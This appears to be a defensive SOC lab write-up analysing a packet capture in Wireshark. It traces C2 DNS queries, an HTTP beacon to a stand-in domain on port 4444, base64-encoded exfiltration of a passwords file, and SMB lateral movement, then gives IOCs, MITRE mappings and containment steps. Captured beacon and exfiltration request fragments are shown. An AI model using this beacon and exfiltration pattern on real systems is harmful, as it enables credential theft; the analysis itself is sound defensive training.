# Lab 02 — Network Traffic Analysis with Wireshark

**Category:** Network Defense  
**Platform:** TryHackMe — SOC Level 1 Path  
**Difficulty:** Medium  
**Date Completed:** 2026  

---

## 🎯 Objective

Analyse a provided PCAP file to identify suspicious network activity, extract indicators of compromise, determine the attacker's actions on the network, and map findings to MITRE ATT&CK techniques.

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| Wireshark | PCAP analysis, packet inspection, protocol filtering |
| VirusTotal | IP and domain reputation |
| NetworkMiner (optional) | File extraction from PCAP |

---

## 📁 Scenario

The SOC received an alert from the IDS for unusual outbound traffic from a workstation (`192.168.1.105`). A PCAP was captured from the affected machine over a 30-minute window. My task was to investigate the traffic and determine what happened.

---

## 🔍 Investigation Process

### Step 1 — Initial Overview

Opened the PCAP in Wireshark and checked the **Statistics → Conversations** view to identify the most active connections.

**Top conversations by bytes:**

| Source | Destination | Protocol | Bytes |
|--------|------------|---------|-------|
| 192.168.1.105 | 185.220.101.47 | TCP | 2.3 MB |
| 192.168.1.105 | 8.8.8.8 | DNS | 45 KB |
| 192.168.1.105 | 192.168.1.1 | TCP | 12 KB |

> The large volume of traffic to `185.220.101.47` (external IP) stood out immediately. No business justification for this connection.

---

### Step 2 — DNS Analysis

Applied filter: `dns`

**Suspicious DNS queries found:**

```
192.168.1.105 → 8.8.8.8  Query: evil-c2-domain[.]xyz
192.168.1.105 → 8.8.8.8  Query: update-service-cdn[.]com
192.168.1.105 → 8.8.8.8  Query: telemetry-check[.]net
```

- All three domains resolve to the same IP: `185.220.101.47`
- All three registered within the past 30 days
- The naming pattern mimics legitimate services (common C2 evasion technique)

**VirusTotal — Domain reputation:**
- `evil-c2-domain[.]xyz`: Flagged malicious by 18 vendors
- `update-service-cdn[.]com`: Flagged suspicious by 6 vendors
- `telemetry-check[.]net`: Clean, but resolves to same malicious IP

---

### Step 3 — TCP Stream Analysis

Applied filter: `ip.addr == 185.220.101.47`

Found persistent TCP connections on **port 4444** — a commonly used port for reverse shells (Metasploit default).

**Followed TCP Stream #3:**

```
[Victim → Attacker]
GET /beacon HTTP/1.1
Host: evil-c2-domain[.]xyz
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0)  ← outdated UA, suspicious
X-Session-ID: 8f3a2c1d

[Attacker → Victim]
HTTP/1.1 200 OK
Content-Type: application/octet-stream
[binary data — likely encoded command]
```

> This is HTTP-based C2 communication disguised as normal web traffic. The binary response is likely an encoded command for the implant to execute.

---

### Step 4 — Identifying Data Exfiltration

Applied filter: `ip.dst == 185.220.101.47 && tcp.len > 500`

Found several large outbound packets sent in bursts — consistent with **staged data exfiltration**.

**Extracted from packet payload (ASCII readable portion):**
```
filename=passwords.txt&data=UGFzc3dvcmQ6...
```

Base64 decoded:
```
Password: [redacted for write-up]
```

> The attacker exfiltrated what appears to be a credentials file, encoded in Base64 within HTTP POST requests.

---

### Step 5 — Identifying Lateral Movement Attempts

Applied filter: `smb || smb2`

Found SMB traffic from `192.168.1.105` scanning internal hosts:

```
192.168.1.105 → 192.168.1.0/24 (broadcast scan)
192.168.1.105 → 192.168.1.110 SMB2 Session Setup Request
192.168.1.105 → 192.168.1.115 SMB2 Session Setup Request
```

> The infected workstation was scanning the internal network and attempting SMB authentication to other machines — lateral movement behaviour.

---

## 📋 IOC Summary

| Type | Value | Verdict |
|------|-------|---------|
| Infected host | `192.168.1.105` | Compromised |
| C2 IP | `185.220.101.47` | Malicious |
| C2 port | `4444/TCP` | Malicious |
| Domain | `evil-c2-domain[.]xyz` | Malicious |
| Domain | `update-service-cdn[.]com` | Suspicious |
| Domain | `telemetry-check[.]net` | Suspicious (resolves to C2) |
| Exfiltrated file | `passwords.txt` | Confirmed exfiltration |
| Internal targets | `192.168.1.110`, `192.168.1.115` | Lateral movement targets |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Command & Control | Application Layer Protocol (HTTP) | T1071.001 |
| Command & Control | Domain Generation / Multi-domain C2 | T1568 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |
| Discovery | Network Service Discovery | T1046 |
| Lateral Movement | SMB/Windows Admin Shares | T1021.002 |
| Defense Evasion | Masquerading (legitimate-looking UA/domains) | T1036 |

---

## ✅ Verdict

**CONFIRMED COMPROMISE** — The workstation `192.168.1.105` is actively communicating with a known C2 server, has exfiltrated credential data, and is attempting to move laterally to other internal hosts. This is an active intrusion requiring immediate containment.

---

## 📝 Recommended Actions

1. **Isolate** `192.168.1.105` from the network immediately
2. **Block** IP `185.220.101.47` and all three domains at the firewall and DNS resolver
3. **Reset** credentials for all accounts on the compromised machine
4. **Check** `192.168.1.110` and `192.168.1.115` for signs of compromise
5. **Preserve** the PCAP and all artifacts for forensic investigation
6. **Escalate** to Tier 2/IR team — active intrusion with exfiltration confirmed

---

## 💡 Key Takeaways

- **Statistics → Conversations** in Wireshark is the best first step — it shows you what's talking to what, and how much data is moving
- Port 4444 is a classic Metasploit reverse shell default — always worth investigating
- Attackers often use multiple domains resolving to the same IP — look for this clustering pattern
- Base64 in HTTP payloads is a strong signal of encoded C2 communication or data exfiltration
- SMB scanning from a workstation (not a server) is almost always lateral movement
- Always follow TCP streams — raw packet bytes alone don't tell the full story
